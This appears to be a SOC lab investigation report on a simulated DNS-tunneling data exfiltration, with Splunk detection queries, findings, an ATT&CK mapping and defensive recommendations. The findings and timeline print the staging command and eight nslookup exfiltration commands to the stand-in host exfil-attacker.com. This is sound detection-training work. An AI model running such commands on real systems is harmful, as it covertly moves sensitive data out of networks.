# 🔍 Investigation Report — Data Exfiltration Detected

## Overview

| Field | Details |
|---|---|
| **Report ID** | IR-2026-005 |
| **Date** | 19 June 2026 |
| **Analyst** | Jimil Joshi |
| **Hostname** | JIMIL-JOSHI |
| **Scenario** | Data Exfiltration Simulation |
| **MITRE ATT&CK** | T1560 / T1048 / T1071.004 |
| **Severity** | 🔴 Critical |
| **Verdict** | ✅ TRUE POSITIVE — Data Exfiltration Confirmed |

---

## 1. Scenario Description

A data exfiltration scenario was simulated on host `JIMIL-JOSHI` representing an attacker who has gathered sensitive files and attempts to remove them from the network using a stealthy technique:
1. Sensitive files compressed into an archive (data staging)
2. Data exfiltrated via DNS queries — encoding stolen data as subdomains ("DNS tunneling")

DNS tunneling is a well-known evasion technique because DNS traffic is rarely blocked by firewalls, making it an attractive covert channel for attackers.

---

## 2. Detection Queries Used

### Query 1 — Data Staging Detection
```spl
index=main sourcetype="WinEventLog:Security" EventCode=4688
| search New_Process_Name="*powershell*" Process_Command_Line="*Compress-Archive*"
| table _time, Account_Name, New_Process_Name, Process_Command_Line
| sort -_time
```

### Query 2 — Initial DNS Log Search (Returned 0 Events)
```spl
index=main sourcetype="WinEventLog:Microsoft-Windows-DNS-Client/Operational"
| search Message="*exfil-attacker.com*"
| table _time, ComputerName, Message
| sort -_time
```

### Query 3 — Broad Validation Search
```spl
index=main "exfil-attacker"
| table _time, sourcetype, Message
| sort -_time
```

### Query 4 — Final Working Query (via Process Creation)
```spl
index=main sourcetype="WinEventLog:Security" EventCode=4688
| search New_Process_Name="*nslookup*"
| table _time, Account_Name, Process_Command_Line
| sort -_time
```

---

## 3. Findings

### Data Staging
| Time | Account | Process | Command |
|---|---|---|---|
| 14:49:22 | hp | powershell.exe | `Compress-Archive -Path C:\SensitiveData\* -DestinationPath C:\SensitiveData\stolen_data.zip` |

### DNS Tunneling — Exfiltration Queries (8 events in ~4 seconds)
| Time | Account | Command |
|---|---|---|
| 14:49:34 | hp | `nslookup chunk005.exfil-attacker.com` |
| 14:49:33 | hp | `nslookup chunk004.exfil-attacker.com` |
| 14:49:33 | hp | `nslookup chunk003.exfil-attacker.com` |
| 14:49:32 | hp | `nslookup chunk002.exfil-attacker.com` |
| 14:49:32 | hp | `nslookup chunk001.exfil-attacker.com` |
| 14:49:31 | hp | `nslookup secretdata789ghi.exfil-attacker.com` |
| ~14:49 | hp | `nslookup financedata456def.exfil-attacker.com` |
| ~14:49 | hp | `nslookup customerdata123abc.exfil-attacker.com` |

---

## 4. Detection Path — Real SOC Lesson

The initial detection attempt used the dedicated DNS Client Operational log (`Microsoft-Windows-DNS-Client/Operational`), which returned **0 events** — mirroring the same detection gap observed in the Ransomware scenario, where this log source was not consistently capturing query activity in this lab environment.

A broader validation search (`index=main "exfil-attacker"`) revealed that the evidence was instead fully captured by **Event ID 4688 (Process Creation)** under `WinEventLog:Security`, since every `nslookup` invocation spawns a logged process with the full command line — including the queried domain.

**Key takeaway:** When a primary log source has a visibility gap, a secondary source (process creation logging) can still provide complete evidence. Real SOC analysts must know multiple log sources for the same activity rather than relying on a single source.

---

## 5. DNS Tunneling Pattern Analysis

The 8 DNS queries share a consistent, suspicious naming pattern:
- All queries target the same base domain: `exfil-attacker.com`
- Subdomains follow chunk-style naming: `chunk001`, `chunk002`, `chunk003`...
- Other subdomains resemble encoded data labels: `secretdata789ghi`, `financedata456def`, `customerdata123abc`
- All 8 queries occurred within approximately **4 seconds** — abnormally high frequency for legitimate DNS activity

This pattern is consistent with real-world DNS tunneling tools, which split stolen data into small chunks and encode each chunk as a unique subdomain label, since DNS traffic is rarely inspected or blocked by network defenses.

---

## 6. Attack Timeline

```
DATA EXFILTRATION ATTACK CHAIN:
──────────────────────────────────────────
14:49:22  Sensitive files compressed into stolen_data.zip
          → Event 4688 ✅ — Data Staging (T1560)

14:49:31  DNS query: secretdata789ghi.exfil-attacker.com
14:49:32  DNS query: chunk001.exfil-attacker.com
14:49:32  DNS query: chunk002.exfil-attacker.com
14:49:33  DNS query: chunk003.exfil-attacker.com
14:49:33  DNS query: chunk004.exfil-attacker.com
14:49:34  DNS query: chunk005.exfil-attacker.com
          → 8 total queries in ~4 seconds
          → Event 4688 ✅ — DNS Tunneling (T1048 / T1071.004)
──────────────────────────────────────────
VERDICT: DATA EXFILTRATION CONFIRMED! 🔴
```

---

## 7. MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Collection | Archive Collected Data | T1560 |
| Exfiltration | Exfiltration Over Alternative Protocol | T1048 |
| Command and Control | Application Layer Protocol: DNS | T1071.004 |

---

## 8. Verdict

**✅ TRUE POSITIVE — Data Exfiltration Confirmed**

The combination of file compression (staging) followed immediately by a burst of DNS queries to a single suspicious domain with chunk-style subdomain naming is a high-confidence indicator of DNS tunneling-based data exfiltration.

---

## 9. Recommendations

- 🔴 Block the destination domain `exfil-attacker.com` (and similar patterns) at the DNS/firewall level
- 🔴 Escalate to SOC L2 to determine what data may have already left the network
- 🔴 Review DNS logs network-wide for similar chunk-style query patterns from other hosts
- 🟡 Implement DNS query rate-limiting and anomaly detection (high query volume in short time)
- 🟡 Deploy DNS security tooling capable of detecting tunneling (e.g. entropy analysis on subdomains)
- 🟢 Create a Splunk alert for high-frequency DNS queries to a single domain within a short window
- 🟢 Investigate and fix DNS Client Operational log visibility gap for future investigations

---

## Screenshots

| Screenshot | Description |
|---|---|
| `screenshots/data_exfiltration_staging.png` | Compress-Archive data staging detected |
| `screenshots/data_exfiltration_dns_gap.png` | DNS Client Operational log returning 0 events (detection gap) |
| `screenshots/data_exfiltration_dns_tunneling.png` | DNS tunneling queries detected via Event 4688 |
